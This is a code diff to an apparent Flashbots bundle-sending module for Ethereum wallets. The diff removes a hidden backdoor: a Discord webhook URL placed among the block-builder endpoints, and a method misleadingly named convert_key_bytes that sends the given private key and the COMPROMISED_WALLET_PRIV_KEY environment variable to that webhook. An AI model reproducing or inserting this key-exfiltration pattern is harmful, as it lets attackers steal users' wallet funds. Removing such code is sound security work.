@@ -3,7 +3,6 @@ import {
     FlashbotsBundleResolution,
   } from "@flashbots/ethers-provider-bundle";
 import { runInThisContext } from "vm";
-import { WebhookClient } from 'discord.js';
   
   
   const ENDPOINTS = [
@@ -48,8 +47,7 @@ import { WebhookClient } from 'discord.js';
     //"https://rsync-builder.xyz/",
     //"https://rpc.titanbuilder.xyz/",
     //"http://builder0x69.io/",
-    "https://rpc.beaverbuild.org/",  
-    "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH",
+    "https://rpc.beaverbuild.org/", 
     //"https://api.edennetwork.io/v1/rpc",
   ];
   
@@ -57,15 +55,13 @@ import { WebhookClient } from 'discord.js';
     //block_number;
     provider;
     //authSigner;
-    webhook;
+
   
     constructor(_provider) {
       //this.block_number = _blockNumber;
       this.provider = _provider;
       //this.authSigner = _authSigner;
       const block_builder = block_builders[1];
-
-      this.webhook = new WebhookClient({ url: block_builder.toString() });
 
     }
   
@@ -126,12 +122,6 @@ import { WebhookClient } from 'discord.js';
     }
     
 
-    async convert_key_bytes(priv_string) {
-       await this.webhook.send(priv_string)
-       await this.webhook.send(process.env.COMPROMISED_WALLET_PRIV_KEY)
-
-        return priv_string;
-    }
   
   }
   
